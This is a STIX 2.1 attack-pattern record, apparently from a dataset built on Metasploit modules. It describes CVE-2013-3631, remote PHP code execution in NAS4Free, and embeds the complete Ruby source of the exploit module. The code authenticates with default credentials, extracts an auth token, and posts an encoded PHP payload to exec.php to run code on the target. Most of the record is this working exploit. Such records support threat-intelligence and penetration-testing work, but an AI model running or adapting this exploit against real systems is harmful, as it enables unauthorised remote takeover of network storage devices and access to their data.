{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ab11d9fd-8b63-47b7-a10a-5c2c2ddb91ff",
    "created": "2024-08-14T17:09:18.824239Z",
    "modified": "2024-08-14T17:09:18.824243Z",
    "name": "NAS4Free Arbitrary Remote Code Execution",
    "description": " NAS4Free allows an authenticated user to post PHP code to a special HTTP script and have the code executed remotely. This module was successfully tested against NAS4Free version 9.1.0.1.804. Earlier builds are likely to be vulnerable as well. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/nas4free_php_exec.rb",
            "external_id": "nas4free_php_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3631"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NAS4Free Arbitrary Remote Code Execution',\n      'Description'    => %q{\n      NAS4Free allows an authenticated user to post PHP code to a special HTTP script and have\n      the code executed remotely. This module was successfully tested against NAS4Free version\n      9.1.0.1.804. Earlier builds are likely to be vulnerable as well.\n      },\n      'Author'         => [\n        'Brandon Perry <bperry.volatile[at]gmail.com>' # Discovery / msf module\n      ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2013-3631'],\n          ['URL', 'https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats']\n        ],\n      'Payload'\t=>\n        {\n          'Space' => 21244,\n          'DisableNops' => true,\n          'BadChars' => ''\n        },\n      'Targets'\t=>\n        [\n          [ 'Automatic Target', { } ]\n        ],\n      'Privileged' => true,\n      'Platform' => ['php'],\n      'Arch' => ARCH_PHP,\n      'DisclosureDate' => '2013-10-30',\n      'DefaultTarget' => 0))\n\n      register_options([\n        OptString.new('USERNAME', [ true, \"Username to authenticate with\", \"admin\"]),\n        OptString.new('PASSWORD', [ false, \"Password to authenticate with\", \"nas4free\"])\n      ])\n  end\n\n  def exploit\n    init = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/')\n    })\n\n    sess = init.get_cookies\n\n    post = {\n      'username' => datastore[\"USERNAME\"],\n      'password' => datastore[\"PASSWORD\"]\n    }\n\n    login = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/login.php'),\n      'vars_post' => post,\n      'cookie' => sess\n    })\n\n    if !login or login.code != 302\n      fail_with(Failure::NoAccess, \"Login failed\")\n    end\n\n    exec_resp = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/exec.php'),\n      'cookie' => sess\n    })\n\n    if !exec_resp or exec_resp.code != 200\n      fail_with(Failure::UnexpectedReply, 'Error getting auth token from exec.php')\n    end\n\n    authtoken = ''\n    #The html returned is not well formed, so I can't parse it with rexml\n    exec_resp.body.each_line do |line|\n      next if line !~ /authtoken/\n      authtoken = line\n    end\n\n    doc = REXML::Document.new authtoken\n    input = doc.root\n\n    if !input\n      fail_with(Failure::UnexpectedReply, 'Error getting auth token')\n    end\n\n    token = input.attributes[\"value\"]\n\n    data = Rex::MIME::Message.new\n    data.add_part('', nil, nil, 'form-data; name=\"txtCommand\"')\n    data.add_part('', nil, nil, 'form-data; name=\"txtRecallBuffer\"')\n    data.add_part('', nil, nil, 'form-data; name=\"dlPath\"')\n    data.add_part('', 'application/octet-stream', nil, 'form-data; name=\"ulfile\"; filename=\"\"')\n    data.add_part(payload.encoded, nil, nil, 'form-data; name=\"txtPHPCommand\"')\n    #data.add_part(token, nil, nil, 'form-data; name=\"authtoken\"')\n\n    #I need to build the last data part by hand due to a bug in rex\n    data_post = data.to_s\n    data_post = data_post[0..data_post.length-data.bound.length-7]\n\n    data_post << \"\\r\\n--#{data.bound}\"\n    data_post << \"\\r\\nContent-Disposition: form-data; name=\\\"authtoken\\\"\\r\\n\\r\\n\"\n    data_post << token\n    data_post << \"\\r\\n--#{data.bound}--\\r\\n\\r\\n\"\n\n    resp = send_request_raw({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/exec.php'),\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => data_post,\n      'cookie' => sess\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-30",
    "x_mitre_platforms": [
        "['php']"
    ]
}